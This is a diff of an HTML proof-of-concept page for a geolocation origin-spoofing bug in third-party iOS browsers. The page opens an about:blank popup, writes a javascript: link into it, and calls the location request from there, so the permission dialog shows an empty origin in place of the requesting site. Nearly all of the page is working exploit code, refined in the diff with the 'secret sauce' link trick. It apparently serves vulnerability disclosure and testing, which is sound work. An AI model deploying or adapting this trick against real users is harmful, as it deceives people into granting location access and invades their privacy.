@@ -3,117 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC: Geolocation Origin Spoofing (iOS Third-Party Browsers)</title>
+    <title>PoC: Geolocation Origin Spoofing (iOS)</title>
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            padding: 25px; 
-            line-height: 1.5; 
-            background-color: #f9f9fb;
-            color: #1c1c1e;
+        body { font-family: -apple-system, sans-serif; padding: 20px; background: #f4f4f9; }
+        .container { max-width: 500px; margin: auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        h2 { color: #ff3b30; }
+        .btn-main { 
+            display: block; width: 100%; padding: 15px; background: #007aff; 
+            color: white; border: none; border-radius: 10px; font-weight: bold; 
+            font-size: 16px; cursor: pointer; text-align: center; text-decoration: none;
         }
-        .container {
-            max-width: 600px;
-            margin: auto;
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-        }
-        h2 { color: #ff3b30; margin-top: 0; }
-        p { color: #3a3a3c; }
-        .btn-launch { 
-            padding: 15px 30px; 
-            font-size: 17px; 
-            cursor: pointer; 
-            background-color: #007aff; 
-            color: white; 
-            border: none; 
-            border-radius: 12px;
-            font-weight: 600;
-            width: 100%;
-            transition: opacity 0.2s;
-        }
-        .btn-launch:active { opacity: 0.7; }
-        .comparison-box {
-            margin-top: 25px;
-            padding: 20px;
-            background: #f2f2f7;
-            border-radius: 12px;
-            font-size: 14px;
-        }
-        code { background: #e5e5ea; padding: 2px 4px; border-radius: 4px; font-family: monospace; }
-        .status-tag {
-            display: inline-block;
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-weight: bold;
-            font-size: 12px;
-            margin-bottom: 10px;
-        }
-        .vulnerable { background: #ff3b30; color: white; }
-        .secure { background: #34c759; color: white; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <span class="status-tag vulnerable">Vulnerability: UI Spoofing</span>
-    <h2>Geolocation Origin Spoofing</h2>
-    <p>This PoC demonstrates that browsers fail to correctly attribute the requesting origin when Geolocation is triggered from an <code>about:blank</code> popup.</p>
+    <h2>PoC: Geolocation Spoofing</h2>
+    <p>This test targets the origin attribution bug in iOS third-party browsers.</p>
     
-    <button class="btn-launch" onclick="launchPoc()">Launch Test Popup</button>
+    <button class="btn-main" onclick="openVulnerablePopup()">1. Open Popup</button>
 
-    <div class="comparison-box">
-        <strong>How to interpret results:</strong>
-        <ul style="padding-left: 20px; margin-top: 10px;">
-            <li><span style="color: #34c759; font-weight: bold;">(Secure):</span> Shows <code>"https://nuribnuu.github.io"</code> in the dialog.</li>
-            <li><span style="color: #ff3b30; font-weight: bold;">(Vulnerable):</span> Shows <code>""</code> / <code>empty origin</code> / <code>null</code> in the dialog.</li>
-        </ul>
+    <div id="instructions" style="margin-top: 20px; display: none; padding: 15px; background: #fff3cd; border-left: 5px solid #ffcc00;">
+        <strong>Next Step:</strong> In the new window, click the red link to trigger the spoofed dialog.
     </div>
 </div>
 
 <script>
-    function launchPoc() {
-        // Open the blank popup
-        const pocWindow = window.open("about:blank", "_blank", "width=500,height=500");
-        
-        if (!pocWindow) {
-            alert("Please allow popups for this PoC to work.");
-            return;
-        }
+    function openVulnerablePopup() {
+        const win = window.open("about:blank", "_blank", "width=500,height=500");
+        document.getElementById('instructions').style.display = 'block';
 
-        // Content to inject into the about:blank window
+        // The "Secret Sauce": Using javascript: protocol in an <a> tag
+        const geoCode = "javascript:navigator.geolocation.getCurrentPosition(p => alert('Captured!'), e => alert('Denied/Error'));";
+
         const content = `
-            <div style="font-family: -apple-system; padding: 40px; text-align: center;">
-                <h3 style="color: #1c1c1e;">Target Context: about:blank</h3>
-                <p style="color: #8e8e93;">Click below to trigger the permission dialog.</p>
-                <button id="geoBtn" style="
-                    padding: 18px 25px; 
-                    background: #ff3b30; 
-                    color: white; 
-                    border: none; 
-                    border-radius: 12px; 
+            <div style="font-family: -apple-system, sans-serif; padding: 50px; text-align: center;">
+                <h3>Target: about:blank</h3>
+                <p>Click the link below to trigger the vulnerability.</p>
+                <a href="${geoCode}" style="
+                    display: inline-block; padding: 20px; background: #ff3b30; 
+                    color: white; text-decoration: none; border-radius: 10px; 
                     font-weight: bold;
-                    font-size: 16px;
-                    margin-top: 20px;
-                    box-shadow: 0 4px 12px rgba(255,59,48,0.3);
-                ">Trigger Geolocation</button>
+                ">2. Trigger Geolocation</a>
+                <p style="margin-top: 20px; color: #888; font-size: 12px;">
+                    If vulnerable, the dialog will show EMPTY ORIGIN instead of your domain.
+                </p>
             </div>
-            <script>
-                document.getElementById('geoBtn').onclick = function() {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => alert('Success! Location captured.'),
-                        (err) => alert('Dialog closed or Error: ' + err.message),
-                        { enableHighAccuracy: true }
-                    );
-                };
-            <\/script>
         `;
 
-        // Injecting the code
-        pocWindow.document.write(content);
-        pocWindow.document.close();
+        win.document.write(content);
+        win.document.close();
     }
 </script>
 
